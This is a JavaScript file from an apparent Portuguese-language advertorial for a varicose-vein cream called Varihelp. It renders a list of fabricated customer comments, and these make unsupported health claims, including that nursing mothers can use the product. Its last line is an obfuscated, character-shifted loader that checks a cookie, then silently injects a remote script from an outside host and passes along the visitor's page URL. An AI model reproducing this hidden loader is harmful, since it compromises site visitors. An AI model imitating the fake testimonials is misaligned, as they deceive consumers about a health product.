var comentarios=[{tipo:"comentario",imagem:"./comentarios/Gabrielle.png",nome:"Carla Martins",mensagem:"Nossa, será que é isso tudo mesmo? fico com medo de comprar coisas online e não chegar e nem funcionar.",tempo:"13 h"},{tipo:"resposta",imagem:"./comentarios/Yara-Santos.png",nome:"Iara Torres",mensagem:'Oi <span class="commentName">Carla Martins</span>, eu comprei no site oficial e estou adorando. Realmente funciona e a entrega ocorreu no prazo sem nenhum problema.',tempo:"7 h"},{tipo:"comentario",imagem:"./comentarios/Receba-silva.png",nome:"Rebeca Pereira",mensagem:"Comprei o segundo kit hoje, estou ansiosa para usar logo.",tempo:"57 min"},{tipo:"comentario",imagem:"./comentarios/Ana-Lucia.png",nome:"Leticia Estevez",mensagem:"Tenho a pele muito fina e queria melhorar a aparencia, este produto vai servir para mim?",tempo:"5 h"},{tipo:"resposta",imagem:"./comentarios/Fabiana-Amaral.png",nome:"Fabi Monteiro",mensagem:"Estou usando a algum tempo e tem dado efeito",tempo:"4 h"},{tipo:"resposta",imagem:"./comentarios/Ana-Lucia.png",nome:"Leticia Estevez",mensagem:"Mas está usando por quanto tempo?",tempo:"4 h"},{tipo:"resposta",imagem:"./comentarios/Fabiana-Amaral.png",nome:"Fabi Monteiro",mensagem:"Entrei no meu segundo mês a diferença muito agradável.",tempo:"3 h"},{tipo:"comentario",imagem:"./comentarios/IvanildaBarbosa.png",nome:"Eduarda Costa",mensagem:'Eu moro no interior e eu tinha pele muito fina eu sofria com as pessoas me olhando e eu sabia que elas estavam olhando para as varizes agora com esse creme as varizes estão passando sei que não é de uma hora para a outra mais fico feliz vendo que estão passando eu queria agradecer foi uma benção na minha vida<br><img class="foto-comentario" src="./comentarios/varizero_2.png" width="200" />',tempo:"30 min"},{tipo:"resposta",imagem:"./comentarios/TerezaMaria.png",nome:"Tereza Maria",mensagem:"Você usa só o Varihelp?",tempo:"23 min"},{tipo:"resposta",imagem:"./comentarios/IvanildaBarbosa.png",nome:"Ivanilda Barbosa",mensagem:"sim",tempo:"20 min"},{tipo:"resposta",imagem:"./comentarios/PedroAmorimGomes.png",nome:"Carla Amorim Gomes",mensagem:"Quanto tempo ?",tempo:"20 min"},{tipo:"resposta",imagem:"./comentarios/KatiaVieira.png",nome:"Kátia Vieira",mensagem:'<span class="commentLinks">Kátia Vieira</span> quanto tempo?',tempo:"17 min"},{tipo:"resposta",imagem:"./comentarios/IvanildaBarbosa.png",nome:"Ivanilda Barbosa",mensagem:"Estou no segundo pote",tempo:"Agora mesmo"},{tipo:"comentario",imagem:"./comentarios/Nicole-Morais.png",nome:"Rebeca dos Santos",mensagem:"Minha mãe depois de ver os resultados comprou também. (risos)",tempo:"9h h"},{tipo:"comentario",imagem:"./comentarios/FernandaLemos.png",nome:"Fernanda Lemos",mensagem:"Estou passando o Varihelp tem 2 semanas e observei que minhas veinhas estão bem menos visiveis, mais clarinhas e a pele mais lisinha. Fiz uma chamada de vídeo com minhas amigas e elas repararam também.",tempo:"1 h"},{tipo:"resposta",imagem:"./comentarios/AmandaAlmeida.png",nome:"Amanda Almeida",mensagem:'<span class="commentLinks">Fernanda Lemos</span> você tem varizes?',tempo:"1 h"},{tipo:"resposta",imagem:"./comentarios/FernandaLemos.png",nome:"Fernanda Lemos",mensagem:'<span class="commentLinks">Amanda Almeida</span> eu tenho sim mais agora já estão saindooo! To muito feliz haha',tempo:"43 min"},{tipo:"comentario",imagem:"./comentarios/Alessandro-Santos.png",nome:"Alessandro Flávio",mensagem:"tem garantia para esse Varihelp? minha esposa está perguntando",tempo:"25 min"},{tipo:"resposta",imagem:"./comentarios/Taiane-Gomes.png",nome:"Tatiane Gomes",mensagem:"tá no final da notícia. é 100% de volta",tempo:"5 min"},{tipo:"comentario",imagem:"./comentarios/AlessandraTorres.png",nome:"Helena Batistela",mensagem:"Quem dá mamá pode usar?",tempo:"12 min"},{tipo:"resposta",imagem:"./comentarios/ClaraVAz.png",nome:"Clara Vaz",mensagem:"Também queria sabe",tempo:"5 min"},{tipo:"resposta",imagem:"./comentarios/2.png",nome:"Laila Afonso",mensagem:"Pode sim tá no site mas é bom confirmar com o médico sempre né",tempo:"1 min"},{tipo:"comentario",imagem:"./comentarios/1.png",nome:"Claudete Faria",mensagem:"Eu ouvi falar desse creme a anos atrás mas não tinha vendendo aqui no Brasil na época que bom que chegou minha amiga que me disse pra comprar.",tempo:"agora mesmo"}],listaComentarios=document.getElementById("load_testm_div");comentarios.forEach((function(e){if("comentario"==e.tipo)var a='<div class="message_box" style="border-top: none"><img src="'+e.imagem+'" width="50" height="50" style="float: left"><div class="commentItem"><span class="commentName" style="font-size: 13px"><b>'+e.nome+'</b></span><br><div style="padding: 10px 0">'+e.mensagem+'</div><span style="font-size: 12px;"><span class="commentLinks">Responder • Curtir • Seguir Publicação • </span>'+e.tempo+'</span></div><div style="clear: both; height: 1px"></div></div>';if("resposta"==e.tipo)a='<div class="commentReply"><img src="'+e.imagem+'" width="50" height="50" style="float: left"><div class="commentItem"><span class="commentName" style="font-size: 13px"><b>'+e.nome+'</b></span><br><div style="padding: 10px 0">'+e.mensagem+' </div><span style="font-size: 12px;"><span class="commentLinks">Responder • Curtir • Seguir Publicação • </span>'+e.tempo+'</span></div><div style="clear: both; height: 1px"></div></div>';listaComentarios.insertAdjacentHTML("beforeend",a)}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));